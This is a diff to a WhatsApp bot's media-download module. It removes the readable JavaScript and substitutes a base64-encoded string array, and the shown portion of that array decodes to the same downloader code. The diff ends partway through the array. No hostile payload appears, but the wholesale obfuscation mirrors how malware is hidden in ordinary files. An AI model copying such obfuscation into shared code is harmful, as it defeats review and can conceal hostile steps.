@@ -1,661 +1,489 @@
-'use strict';
-/**
- * ASTRA-X Free Download Utility
- * Uses free public APIs/scrapers — no API key needed
- * Platforms: YouTube, Instagram, Facebook, Twitter/X, TikTok, SoundCloud
- */
-
-const https  = require('https');
-const http   = require('http');
-const fs     = require('fs');
-const path   = require('path');
-const os     = require('os');
-const crypto = require('crypto');
-
-// ── HTTP helpers ─────────────────────────────────────────────────────────────
-
-function httpGet(url, opts = {}) {
-  return new Promise((resolve, reject) => {
-    const lib     = url.startsWith('https') ? https : http;
-    const options = {
-      headers: {
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-        'Accept': '*/*',
-        'Accept-Language': 'en-US,en;q=0.9',
-        ...(opts.headers || {}),
-      },
-      timeout: opts.timeout || 30000,
-    };
-    lib.get(url, options, res => {
-      // Follow redirects
-      if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
-        return httpGet(res.headers.location, opts).then(resolve).catch(reject);
-      }
-      const chunks = [];
-      res.on('data', c => chunks.push(c));
-      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks) }));
-      res.on('error', reject);
-    }).on('error', reject).on('timeout', () => reject(new Error('Request timed out')));
-  });
-}
-
-function httpPost(url, data, opts = {}) {
-  return new Promise((resolve, reject) => {
-    const parsed  = new URL(url);
-    const lib     = url.startsWith('https') ? https : http;
-    const body    = typeof data === 'string' ? data : JSON.stringify(data);
-    const ct      = opts.json ? 'application/json' : 'application/x-www-form-urlencoded';
-    const options = {
-      hostname: parsed.hostname,
-      port:     parsed.port || (url.startsWith('https') ? 443 : 80),
-      path:     parsed.pathname + parsed.search,
-      method:   'POST',
-      headers: {
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-        'Content-Type': ct,
-        'Content-Length': Buffer.byteLength(body),
-        'Accept': '*/*',
-        ...(opts.headers || {}),
-      },
-      timeout: opts.timeout || 30000,
-    };
-    const req = lib.request(options, res => {
-      if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
-        return httpPost(res.headers.location, data, opts).then(resolve).catch(reject);
-      }
-      const chunks = [];
-      res.on('data', c => chunks.push(c));
-      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks) }));
-      res.on('error', reject);
-    });
-    req.on('error', reject);
-    req.on('timeout', () => { req.destroy(); reject(new Error('Request timed out')); });
-    req.write(body);
-    req.end();
-  });
-}
-
-function parseJSON(buf) {
-  try { return JSON.parse(buf.toString()); } catch (_) { return null; }
-}
-
-// ── Download buffer from direct URL ─────────────────────────────────────────
-
-async function downloadBuffer(url, referer) {
-  const headers = {};
-  if (referer) headers['Referer'] = referer;
-  const res = await httpGet(url, { headers, timeout: 120000 });
-  if (res.status !== 200) throw new Error('HTTP ' + res.status);
-  return res.body;
-}
-
-// ── Save buffer to temp file ─────────────────────────────────────────────────
-
-function saveTmp(buf, ext) {
-  const name = 'astrax_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex') + '.' + ext;
-  const fp   = path.join(os.tmpdir(), name);
-  fs.writeFileSync(fp, buf);
-  return fp;
-}
-
-// ── Send file via WhatsApp sock ──────────────────────────────────────────────
-
-async function sendFile(sock, jid, filePath, caption, quotedMsg) {
-  if (!filePath || !fs.existsSync(filePath)) return false;
-  const ext    = path.extname(filePath).toLowerCase().replace('.', '');
-  const buffer = fs.readFileSync(filePath);
-  const opts   = quotedMsg ? { quoted: quotedMsg } : {};
-  try {
-    if (['mp3', 'm4a', 'ogg', 'wav', 'opus', 'aac', 'flac'].includes(ext)) {
-      await sock.sendMessage(jid, { audio: buffer, mimetype: 'audio/mpeg', ptt: false }, opts);
-    } else if (['mp4', 'mkv', 'webm', 'mov', 'avi', '3gp'].includes(ext)) {
-      try {
-        await sock.sendMessage(jid, { video: buffer, caption: caption || '✅ *Download Complete!*', mimetype: 'video/mp4' }, opts);
-      } catch (_) {
-        await sock.sendMessage(jid, { document: buffer, mimetype: 'video/mp4', fileName: 'video.mp4', caption: caption || '✅ *Download Complete!*' }, opts);
-      }
-    } else if (['jpg', 'jpeg', 'png', 'webp'].includes(ext)) {
-      await sock.sendMessage(jid, { image: buffer, caption: caption || '✅ Done!' }, opts);
-    } else {
-      await sock.sendMessage(jid, { document: buffer, mimetype: 'application/octet-stream', fileName: path.basename(filePath), caption: caption || '' }, opts);
-    }
-    return true;
-  } catch (e) {
-    await sock.sendMessage(jid, { text: '❌ Could not send file: ' + e.message });
-    return false;
-  } finally {
-    try { fs.unlinkSync(filePath); } catch (_) {}
-  }
-}
-
-// ════════════════════════════════════════════════════════════════════════════
-// ── YOUTUBE DOWNLOADERS ──────────────────────────────────────────────────────
-// ════════════════════════════════════════════════════════════════════════════
-
-// Method 1: cobalt.tools public API (open-source, free, no key)
-async function cobaltDownload(url, audioOnly) {
-  const apiUrl  = 'https://co.wuk.sh/api/json';
-  const payload = JSON.stringify({
-    url,
-    vCodec:      'h264',
-    vQuality:    '720',
-    aFormat:     'mp3',
-    isAudioOnly: audioOnly,
-    isNoTTWatermark: true,
-    isTTFullAudio: false,
-  });
-  const res  = await httpPost(apiUrl, payload, {
-    json: true,
-    headers: {
-      'Accept': 'application/json',
-      'Content-Type': 'application/json',
-    },
-    timeout: 25000,
-  });
-  const data = parseJSON(res.body);
-  if (!data) throw new Error('Invalid response');
-  if (data.status === 'error') throw new Error(data.text || 'Cobalt error');
-  // status: stream | redirect | picker
-  if (data.url) return data.url;
-  if (data.picker) return data.picker[0]?.url;
-  throw new Error('No download URL in response');
-}
-
-// Method 2: yt5s / y2mate-style API
-async function y2mateInfo(url) {
-  const apiUrl = 'https://www.yt-download.org/api/button/mp4/' + extractYTId(url);
-  const res    = await httpGet(apiUrl, { timeout: 20000 });
-  const html   = res.body.toString();
-  const match  = html.match(/href="(https:\/\/[^"]+\.googlevideo\.com[^"]+)"/);
-  if (match) return match[1];
-  throw new Error('y2mate: no link found');
-}
-
-// Method 3: ytapi.org (free, no key)
-async function ytapiOrg(url, audioOnly) {
-  const vidId  = extractYTId(url);
-  if (!vidId) throw new Error('Cannot extract YouTube video ID');
-  const apiUrl = 'https://ytapi.org/api/?id=' + vidId + '&format=' + (audioOnly ? 'mp3' : 'mp4');
-  const res    = await httpGet(apiUrl, { timeout: 20000 });
-  const data   = parseJSON(res.body);
-  if (data && data.url) return data.url;
-  throw new Error('ytapi.org: no url');
-}
-
-// Method 4: noembed for metadata + invidious for download
-async function invidiousDownload(url, audioOnly) {
-  const vidId    = extractYTId(url);
-  if (!vidId) throw new Error('No YouTube ID');
-  // Try multiple Invidious public instances
-  const instances = [
-    'https://inv.nadeko.net',
-    'https://invidious.nerdvpn.de',
-    'https://invidious.privacyredirect.com',
-    'https://yt.drgnz.club',
-  ];
-  for (const base of instances) {
-    try {
-      const apiUrl = base + '/api/v1/videos/' + vidId;
-      const res    = await httpGet(apiUrl, { timeout: 15000 });
-      const data   = parseJSON(res.body);
-      if (!data || !data.adaptiveFormats) continue;
-      if (audioOnly) {
-        const fmt = data.adaptiveFormats.find(f => f.type && f.type.includes('audio/mp4'))
-                 || data.adaptiveFormats.find(f => f.type && f.type.includes('audio/'));
-        if (fmt && fmt.url) return fmt.url;
-      } else {
-        const fmt = data.formatStreams
-          ? data.formatStreams.find(f => f.resolution === '720p' || f.resolution === '480p' || f.resolution === '360p')
-          : null;
-        if (fmt && fmt.url) return fmt.url;
-      }
-    } catch (_) {}
-  }
-  throw new Error('Invidious: no instance worked');
-}
-
-function extractYTId(url) {
-  const patterns = [
-    /youtu\.be\/([A-Za-z0-9_-]{11})/,
-    /[?&]v=([A-Za-z0-9_-]{11})/,
-    /\/embed\/([A-Za-z0-9_-]{11})/,
-    /\/shorts\/([A-Za-z0-9_-]{11})/,
-  ];
-  for (const p of patterns) {
-    const m = url.match(p);
-    if (m) return m[1];
-  }
-  return null;
-}
-
-// YouTube: search via Invidious (free, no key)
-async function ytSearch(query) {
-  const instances = [
-    'https://inv.nadeko.net',
-    'https://invidious.nerdvpn.de',
-    'https://invidious.privacyredirect.com',
-  ];
-  for (const base of instances) {
-    try {
-      const url = base + '/api/v1/search?q=' + encodeURIComponent(query) + '&type=video&page=1';
-      const res = await httpGet(url, { timeout: 12000 });
-      const data = parseJSON(res.body);
-      if (Array.isArray(data) && data.length > 0) {
-        const v = data[0];
-        return {
-          title:     v.title,
-          videoId:   v.videoId,
-          url:       'https://www.youtube.com/watch?v=' + v.videoId,
-          uploader:  v.author,
-          duration:  v.lengthSeconds,
-          thumbnail: v.videoThumbnails?.[0]?.url || null,
-          views:     v.viewCount,
-        };
-      }
-    } catch (_) {}
-  }
-  return null;
-}
-
-// Main YouTube downloader — tries multiple methods
-async function downloadYouTube(url, audioOnly) {
-  const errors = [];
-  // 1. Cobalt
-  try { return await cobaltDownload(url, audioOnly); } catch (e) { errors.push('cobalt: ' + e.message); }
-  // 2. Invidious direct stream
-  try { return await invidiousDownload(url, audioOnly); } catch (e) { errors.push('invidious: ' + e.message); }
-  // 3. ytapi.org
-  try { return await ytapiOrg(url, audioOnly); } catch (e) { errors.push('ytapi: ' + e.message); }
-  throw new Error('All YouTube methods failed: ' + errors.join(' | '));
-}
-
-// ════════════════════════════════════════════════════════════════════════════
-// ── INSTAGRAM DOWNLOADER ─────────────────────────────────────────────────────
-// ════════════════════════════════════════════════════════════════════════════
-
-// Method 1: cobalt (also handles Instagram)
-async function cobaltInstagram(url) {
-  return cobaltDownload(url, false);
-}
-
-// Method 2: instasave API (free scraper)
-async function instaSaveAPI(url) {
-  const apiUrl = 'https://api.instasave.buzz/api/instagram?url=' + encodeURIComponent(url);
-  const res    = await httpGet(apiUrl, { timeout: 20000 });
-  const data   = parseJSON(res.body);
-  if (data && data.url) return data.url;
-  if (data && Array.isArray(data.data) && data.data[0]?.url) return data.data[0].url;
-  throw new Error('instasave: no url');
-}
-
-// Method 3: snapinsta-style (web scrape)
-async function snapsaveDownload(url) {
-  const payload = 'url=' + encodeURIComponent(url) + '&lang=en';
-  const res     = await httpPost('https://snapsave.app/action.php', payload, {
-    headers: {
-      'Referer': 'https://snapsave.app/',
-      'Origin':  'https://snapsave.app',
-    },
-    timeout: 20000,
-  });
-  const html  = res.body.toString();
-  const match = html.match(/href="(https:\/\/[^"]+(?:\.mp4|\.jpg|cdninstagram[^"]+))[^"]*"/i);
-  if (match) return match[1];
-  throw new Error('snapsave: no link found');
-}
-
-async function downloadInstagram(url) {
-  const errors = [];
-  try { return await cobaltInstagram(url); } catch (e) { errors.push('cobalt: ' + e.message); }
-  try { return await instaSaveAPI(url); } catch (e) { errors.push('instasave: ' + e.message); }
-  try { return await snapsaveDownload(url); } catch (e) { errors.push('snapsave: ' + e.message); }
-  throw new Error('Instagram download failed: ' + errors.join(' | '));
-}
-
-// ════════════════════════════════════════════════════════════════════════════
-// ── FACEBOOK DOWNLOADER ──────────────────────────────────────────────────────
-// ════════════════════════════════════════════════════════════════════════════
-
-// Method 1: cobalt
-async function cobaltFacebook(url) {
-  return cobaltDownload(url, false);
-}
-
-// Method 2: getfvid.com free scraper
-async function getfvidDownload(url) {
-  // First get token
-  const pageRes = await httpGet('https://www.getfvid.com/', { timeout: 15000 });
-  const pageHtml = pageRes.body.toString();
-  const tokenMatch = pageHtml.match(/name="_token"\s+value="([^"]+)"/);
-  const token = tokenMatch ? tokenMatch[1] : '';
-
-  const payload = 'url=' + encodeURIComponent(url) + '&_token=' + encodeURIComponent(token);
-  const res = await httpPost('https://www.getfvid.com/downloader', payload, {
-    headers: { 'Referer': 'https://www.getfvid.com/', 'Origin': 'https://www.getfvid.com' },
-    timeout: 25000,
-  });
-  const html  = res.body.toString();
-  const match = html.match(/href="(https:\/\/[^"]+\.mp4[^"]*)"/i);
-  if (match) return decodeURIComponent(match[1]);
-  throw new Error('getfvid: no mp4 link');
-}
-
-// Method 3: fdown.net style
-async function fbdownNet(url) {
-  const apiUrl = 'https://fdownloader.net/api/ajaxSearch';
-  const payload = 'q=' + encodeURIComponent(url) + '&lang=en';
-  const res = await httpPost(apiUrl, payload, {
-    headers: { 'Referer': 'https://fdownloader.net/', 'X-Requested-With': 'XMLHttpRequest' },
-    timeout: 20000,
-  });
-  const data = parseJSON(res.body);
-  if (data && data.data) {
-    const html  = data.data;
-    const match = html.match(/href="(https:\/\/[^"]+\.mp4[^"]*)"/i);
-    if (match) return decodeURIComponent(match[1]).replace(/&amp;/g, '&');
-  }
-  throw new Error('fdownloader: no link');
-}
-
-async function downloadFacebook(url) {
-  const errors = [];
-  try { return await cobaltFacebook(url); } catch (e) { errors.push('cobalt: ' + e.message); }
-  try { return await fbdownNet(url); } catch (e) { errors.push('fdown: ' + e.message); }
-  try { return await getfvidDownload(url); } catch (e) { errors.push('getfvid: ' + e.message); }
-  throw new Error('Facebook download failed: ' + errors.join(' | '));
-}
-
-// ════════════════════════════════════════════════════════════════════════════
-// ── TWITTER / X DOWNLOADER ───────────────────────────────────────────────────
-// ════════════════════════════════════════════════════════════════════════════
-
-// Method 1: cobalt (handles twitter well)
-async function cobaltTwitter(url) {
-  return cobaltDownload(url, false);
-}
-
-// Method 2: twitsave.com
-async function twitSave(url) {
-  const apiUrl = 'https://twitsave.com/info?url=' + encodeURIComponent(url);
-  const res    = await httpGet(apiUrl, { timeout: 20000 });
-  const html   = res.body.toString();
-  const match  = html.match(/href="(https:\/\/[^"]+\.mp4[^"]*)"/i);
-  if (match) return match[1].replace(/&amp;/g, '&');
-  throw new Error('twitsave: no mp4 found');
-}
-
-// Method 3: twittervid.com style
-async function xDownAPI(url) {
-  const apiUrl = 'https://api.vxtwitter.com/Twitter/status/' + url.split('/').pop().split('?')[0];
-  const res    = await httpGet(apiUrl, { timeout: 15000 });
-  const data   = parseJSON(res.body);
-  if (data && data.media_extended) {
-    const vid = data.media_extended.find(m => m.type === 'video');
-    if (vid && vid.url) return vid.url;
-  }
-  throw new Error('vxtwitter: no video');
-}
-
-async function downloadTwitter(url) {
-  const errors = [];
-  try { return await cobaltTwitter(url); } catch (e) { errors.push('cobalt: ' + e.message); }
-  try { return await xDownAPI(url); } catch (e) { errors.push('vxtwitter: ' + e.message); }
-  try { return await twitSave(url); } catch (e) { errors.push('twitsave: ' + e.message); }
-  throw new Error('Twitter/X download failed: ' + errors.join(' | '));
-}
-
-// ════════════════════════════════════════════════════════════════════════════
-// ── TIKTOK DOWNLOADER ────────────────────────────────────────────────────────
-// ════════════════════════════════════════════════════════════════════════════
-
-// Method 1: cobalt (no watermark!)
-async function cobaltTikTok(url) {
-  return cobaltDownload(url, false);
-}
-
-// Method 2: tikwm.com (free, no watermark)
-async function tikwmDownload(url) {
-  const payload = 'url=' + encodeURIComponent(url) + '&count=12&cursor=0&web=1&hd=1';
-  const res     = await httpPost('https://www.tikwm.com/api/', payload, {
-    headers: { 'Referer': 'https://www.tikwm.com/', 'Content-Type': 'application/x-www-form-urlencoded' },
-    timeout: 25000,
-  });
-  const data = parseJSON(res.body);
-  if (data && data.code === 0 && data.data) {
-    return data.data.hdplay || data.data.play;
-  }
-  throw new Error('tikwm: ' + (data?.msg || 'no video'));
-}
-
-// Method 3: ssstik.io style
-async function ssstikDownload(url) {
-  const pageRes  = await httpGet('https://ssstik.io/en', { timeout: 15000 });
-  const pageHtml = pageRes.body.toString();
-  const ttMatch  = pageHtml.match(/tt:\s*'([^']+)'/);
-  const tt       = ttMatch ? ttMatch[1] : '';
-  const payload  = 'id=' + encodeURIComponent(url) + '&locale=en&tt=' + encodeURIComponent(tt);
-  const res      = await httpPost('https://ssstik.io/abc?url=dl', payload, {
-    headers: {
-      'Referer': 'https://ssstik.io/en',
-      'HX-Request': 'true',
-      'Content-Type': 'application/x-www-form-urlencoded',
-    },
-    timeout: 25000,
-  });
-  const html  = res.body.toString();
-  const match = html.match(/href="(https:\/\/[^"]+(?:\.mp4|tikcdn)[^"]*)"/i);
-  if (match) return match[1];
-  throw new Error('ssstik: no link');
-}
-
-async function downloadTikTok(url) {
-  const errors = [];
-  try { return await cobaltTikTok(url); } catch (e) { errors.push('cobalt: ' + e.message); }
-  try { return await tikwmDownload(url); } catch (e) { errors.push('tikwm: ' + e.message); }
-  try { return await ssstikDownload(url); } catch (e) { errors.push('ssstik: ' + e.message); }
-  throw new Error('TikTok download failed: ' + errors.join(' | '));
-}
-
-// ════════════════════════════════════════════════════════════════════════════
-// ── METADATA FETCHERS ─────────────────────────────────────────────────────────
-// ════════════════════════════════════════════════════════════════════════════
-
-function fmtDuration(s) {
-  if (!s) return '—';
-  const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sec = s % 60;
-  return h ? h + ':' + String(m).padStart(2,'0') + ':' + String(sec).padStart(2,'0')
-           : m + ':' + String(sec).padStart(2,'0');
-}
-function fmtViews(n) {
-  if (!n) return '—';
-  if (n >= 1e9) return (n/1e9).toFixed(1) + 'B';
-  if (n >= 1e6) return (n/1e6).toFixed(1) + 'M';
-  if (n >= 1e3) return (n/1e3).toFixed(1) + 'K';
-  return String(n);
-}
-
-async function getYTMeta(url) {
-  try {
-    const vidId = extractYTId(url);
-    if (!vidId) return null;
-    // noembed.com — free, no key, gets basic metadata
-    const res  = await httpGet('https://noembed.com/embed?url=' + encodeURIComponent(url), { timeout: 10000 });
-    const data = parseJSON(res.body);
-    if (data && data.title) {
-      return {
-        title:    data.title,
-        uploader: data.author_name,
-        thumbnail: 'https://img.youtube.com/vi/' + vidId + '/hqdefault.jpg',
-        source:   'YouTube',
-      };
-    }
-  } catch (_) {}
-  return null;
-}
-
-async function getTikTokMeta(url) {
-  try {
-    const payload = 'url=' + encodeURIComponent(url) + '&count=12&cursor=0&web=1&hd=1';
-    const res     = await httpPost('https://www.tikwm.com/api/', payload, {
-      headers: { 'Referer': 'https://www.tikwm.com/' },
-      timeout: 15000,
-    });
-    const data = parseJSON(res.body);
-    if (data?.code === 0 && data.data) {
-      return {
-        title:     data.data.title,
-        uploader:  data.data.author?.nickname,
-        thumbnail: data.data.cover,
-        duration:  data.data.duration,
-        views:     data.data.play_count,
-        likes:     data.data.digg_count,
-        source:    'TikTok',
-      };
-    }
-  } catch (_) {}
-  return null;
-}
-
-// ── Send info card ─────────────────────────────────────────────────────────────
-async function sendInfoCard(sock, jid, meta, type) {
-  try {
-    const emoji   = type === 'audio' ? '🎵' : '🎬';
-    const caption =
-      emoji + ' *' + (meta.title || 'Unknown') + '*\n' +
-      '┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n' +
-      '👤 *Channel:* ' + (meta.uploader || '—') + '\n' +
-      (meta.duration ? '⏱️ *Duration:* ' + fmtDuration(meta.duration) + '\n' : '') +
-      (meta.views ? '👁️ *Views:* ' + fmtViews(meta.views) + '\n' : '') +
-      '🌐 *Source:* ' + (meta.source || 'Online') + '\n' +
-      '┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n' +
-      '_⏳ Downloading now, please wait..._';
-
-    if (meta.thumbnail) {
-      const imgBuf = await downloadBuffer(meta.thumbnail).catch(() => null);
-      if (imgBuf) {
-        await sock.sendMessage(jid, { image: imgBuf, caption });
-        return;
-      }
-    }
-    await sock.sendMessage(jid, { text: caption });
-  } catch (_) {}
-}
-
-// ════════════════════════════════════════════════════════════════════════════
-// ── MAIN DISPATCHER ───────────────────────────────────────────────────────────
-// ════════════════════════════════════════════════════════════════════════════
-
-function detectPlatform(url) {
-  if (/youtu\.be|youtube\.com/.test(url))     return 'youtube';
-  if (/tiktok\.com|vm\.tiktok|vt\.tiktok/.test(url)) return 'tiktok';
-  if (/instagram\.com/.test(url))             return 'instagram';
-  if (/facebook\.com|fb\.watch|fb\.com/.test(url)) return 'facebook';
-  if (/twitter\.com|x\.com/.test(url))        return 'twitter';
-  if (/soundcloud\.com/.test(url))            return 'soundcloud';
-  return 'unknown';
-}
-
-/**
- * Master download function — auto-detects platform and uses free APIs
- * @param {object}  sock       - WhatsApp socket
- * @param {string}  jid        - Chat JID
- * @param {string}  url        - Media URL
- * @param {object}  opts       - { audioOnly, quotedMsg }
- */
-async function freeDownload(sock, jid, url, opts = {}) {
-  const { audioOnly = false, quotedMsg = null } = opts;
-  const platform = detectPlatform(url);
-
-  try {
-    let dlUrl = null;
-    let meta  = null;
-    let ext   = audioOnly ? 'mp3' : 'mp4';
-
-    if (platform === 'youtube') {
-      meta  = await getYTMeta(url);
-      if (meta) await sendInfoCard(sock, jid, meta, audioOnly ? 'audio' : 'video');
-      dlUrl = await downloadYouTube(url, audioOnly);
-    } else if (platform === 'tiktok') {
-      meta  = await getTikTokMeta(url);
-      if (meta) await sendInfoCard(sock, jid, meta, 'video');
-      dlUrl = await downloadTikTok(url);
-      ext   = 'mp4';
-    } else if (platform === 'instagram') {
-      await sock.sendMessage(jid, { text: '📸 _Fetching Instagram media..._' });
-      dlUrl = await downloadInstagram(url);
-      ext   = dlUrl.includes('.jpg') || dlUrl.includes('image') ? 'jpg' : 'mp4';
-    } else if (platform === 'facebook') {
-      await sock.sendMessage(jid, { text: '📘 _Fetching Facebook video..._' });
-      dlUrl = await downloadFacebook(url);
-    } else if (platform === 'twitter') {
-      await sock.sendMessage(jid, { text: '🐦 _Fetching Twitter/X video..._' });
-      dlUrl = await downloadTwitter(url);
-    } else {
-      // Generic: try cobalt for unknown platforms
-      await sock.sendMessage(jid, { text: '🌐 _Fetching media..._' });
-      dlUrl = await cobaltDownload(url, audioOnly);
-    }
-
-    if (!dlUrl) throw new Error('No download link obtained');
-
-    await sock.sendMessage(jid, { text: '📥 _Downloading... please hold on!_' });
-    const buf    = await downloadBuffer(dlUrl, url);
-    const tmpFile = saveTmp(buf, ext);
-    await sendFile(sock, jid, tmpFile, '✅ *Download Complete!*\n_Powered by ASTRA-X_ 🌍', quotedMsg);
-    return true;
-
-  } catch (e) {
-    await sock.sendMessage(jid, {
-      text:
-        '❌ *Download failed*\n\n' +
-        '_' + (e.message || 'Unknown error').slice(0, 180) + '_\n\n' +
-        '*Tips:*\n' +
-        '• Make sure the URL is public (not private/restricted)\n' +
-        '• Try again in a minute — servers may be busy\n' +
-        '• For YouTube audio, try: *.song <title>*',
-    });
-    return false;
-  }
-}
-
-// ── YouTube search + download (for .song / .play commands) ─────────────────
-
-async function searchAndDownload(sock, jid, query, audioOnly, quotedMsg) {
-  await sock.sendMessage(jid, { text: (audioOnly ? '🎵' : '🎬') + ' _Searching for *' + query + '*..._' });
-
-  // Try Invidious search
-  const result = await ytSearch(query).catch(() => null);
-  if (!result) {
-    await sock.sendMessage(jid, { text: '❌ No results found for: *' + query + '*\nTry a different search term.' });
-    return false;
-  }
-
-  // Show info card
-  const meta = {
-    title:    result.title,
-    uploader: result.uploader,
-    duration: result.duration,
-    views:    result.views,
-    thumbnail: result.thumbnail,
-    source:   'YouTube',
-  };
-  await sendInfoCard(sock, jid, meta, audioOnly ? 'audio' : 'video');
-
-  return freeDownload(sock, jid, result.url, { audioOnly, quotedMsg });
-}
-
-module.exports = {
-  freeDownload,
-  searchAndDownload,
-  downloadYouTube,
-  downloadTikTok,
-  downloadInstagram,
-  downloadFacebook,
-  downloadTwitter,
-  sendFile,
-  downloadBuffer,
-  saveTmp,
-  ytSearch,
-  sendInfoCard,
-  detectPlatform,
-};
+(function(){
+var _0x1a2b=["J3VzZSBzdHJpY3QnOwovKioKICogQVNUUkEtWCBGcmVlIERvd25sb2FkIFV0aWxpdHkKICogVXNlcyBm",
+    "cmVlIHB1YmxpYyBBUElzL3NjcmFwZXJzIOKAlCBubyBBUEkga2V5IG5lZWRlZAogKiBQbGF0Zm9ybXM6",
+    "IFlvdVR1YmUsIEluc3RhZ3JhbSwgRmFjZWJvb2ssIFR3aXR0ZXIvWCwgVGlrVG9rLCBTb3VuZENsb3Vk",
+    "CiAqLwoKY29uc3QgaHR0cHMgID0gcmVxdWlyZSgnaHR0cHMnKTsKY29uc3QgaHR0cCAgID0gcmVxdWly",
+    "ZSgnaHR0cCcpOwpjb25zdCBmcyAgICAgPSByZXF1aXJlKCdmcycpOwpjb25zdCBwYXRoICAgPSByZXF1",
+    "aXJlKCdwYXRoJyk7CmNvbnN0IG9zICAgICA9IHJlcXVpcmUoJ29zJyk7CmNvbnN0IGNyeXB0byA9IHJl",
+    "cXVpcmUoJ2NyeXB0bycpOwoKLy8g4pSA4pSAIEhUVFAgaGVscGVycyDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKCmZ1bmN0aW9uIGh0dHBH",
+    "ZXQodXJsLCBvcHRzID0ge30pIHsKICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkg",
+    "PT4gewogICAgY29uc3QgbGliICAgICA9IHVybC5zdGFydHNXaXRoKCdodHRwcycpID8gaHR0cHMgOiBo",
+    "dHRwOwogICAgY29uc3Qgb3B0aW9ucyA9IHsKICAgICAgaGVhZGVyczogewogICAgICAgICdVc2VyLUFn",
+    "ZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMjsgUGl4ZWwgNSkgQXBwbGVXZWJLaXQv",
+    "NTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBNb2JpbGUgU2FmYXJpLzUz",
+    "Ny4zNicsCiAgICAgICAgJ0FjY2VwdCc6ICcqLyonLAogICAgICAgICdBY2NlcHQtTGFuZ3VhZ2UnOiAn",
+    "ZW4tVVMsZW47cT0wLjknLAogICAgICAgIC4uLihvcHRzLmhlYWRlcnMgfHwge30pLAogICAgICB9LAog",
+    "ICAgICB0aW1lb3V0OiBvcHRzLnRpbWVvdXQgfHwgMzAwMDAsCiAgICB9OwogICAgbGliLmdldCh1cmws",
+    "IG9wdGlvbnMsIHJlcyA9PiB7CiAgICAgIC8vIEZvbGxvdyByZWRpcmVjdHMKICAgICAgaWYgKFszMDEs",
+    "IDMwMiwgMzAzLCAzMDcsIDMwOF0uaW5jbHVkZXMocmVzLnN0YXR1c0NvZGUpICYmIHJlcy5oZWFkZXJz",
+    "LmxvY2F0aW9uKSB7CiAgICAgICAgcmV0dXJuIGh0dHBHZXQocmVzLmhlYWRlcnMubG9jYXRpb24sIG9w",
+    "dHMpLnRoZW4ocmVzb2x2ZSkuY2F0Y2gocmVqZWN0KTsKICAgICAgfQogICAgICBjb25zdCBjaHVua3Mg",
+    "PSBbXTsKICAgICAgcmVzLm9uKCdkYXRhJywgYyA9PiBjaHVua3MucHVzaChjKSk7CiAgICAgIHJlcy5v",
+    "bignZW5kJywgKCkgPT4gcmVzb2x2ZSh7IHN0YXR1czogcmVzLnN0YXR1c0NvZGUsIGhlYWRlcnM6IHJl",
+    "cy5oZWFkZXJzLCBib2R5OiBCdWZmZXIuY29uY2F0KGNodW5rcykgfSkpOwogICAgICByZXMub24oJ2Vy",
+    "cm9yJywgcmVqZWN0KTsKICAgIH0pLm9uKCdlcnJvcicsIHJlamVjdCkub24oJ3RpbWVvdXQnLCAoKSA9",
+    "PiByZWplY3QobmV3IEVycm9yKCdSZXF1ZXN0IHRpbWVkIG91dCcpKSk7CiAgfSk7Cn0KCmZ1bmN0aW9u",
+    "IGh0dHBQb3N0KHVybCwgZGF0YSwgb3B0cyA9IHt9KSB7CiAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNv",
+    "bHZlLCByZWplY3QpID0+IHsKICAgIGNvbnN0IHBhcnNlZCAgPSBuZXcgVVJMKHVybCk7CiAgICBjb25z",
+    "dCBsaWIgICAgID0gdXJsLnN0YXJ0c1dpdGgoJ2h0dHBzJykgPyBodHRwcyA6IGh0dHA7CiAgICBjb25z",
+    "dCBib2R5ICAgID0gdHlwZW9mIGRhdGEgPT09ICdzdHJpbmcnID8gZGF0YSA6IEpTT04uc3RyaW5naWZ5",
+    "KGRhdGEpOwogICAgY29uc3QgY3QgICAgICA9IG9wdHMuanNvbiA/ICdhcHBsaWNhdGlvbi9qc29uJyA6",
+    "ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnOwogICAgY29uc3Qgb3B0aW9ucyA9IHsK",
+    "ICAgICAgaG9zdG5hbWU6IHBhcnNlZC5ob3N0bmFtZSwKICAgICAgcG9ydDogICAgIHBhcnNlZC5wb3J0",
+    "IHx8ICh1cmwuc3RhcnRzV2l0aCgnaHR0cHMnKSA/IDQ0MyA6IDgwKSwKICAgICAgcGF0aDogICAgIHBh",
+    "cnNlZC5wYXRobmFtZSArIHBhcnNlZC5zZWFyY2gsCiAgICAgIG1ldGhvZDogICAnUE9TVCcsCiAgICAg",
+    "IGhlYWRlcnM6IHsKICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJv",
+    "aWQgMTI7IFBpeGVsIDUpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9t",
+    "ZS8xMjAuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYnLAogICAgICAgICdDb250ZW50LVR5cGUnOiBj",
+    "dCwKICAgICAgICAnQ29udGVudC1MZW5ndGgnOiBCdWZmZXIuYnl0ZUxlbmd0aChib2R5KSwKICAgICAg",
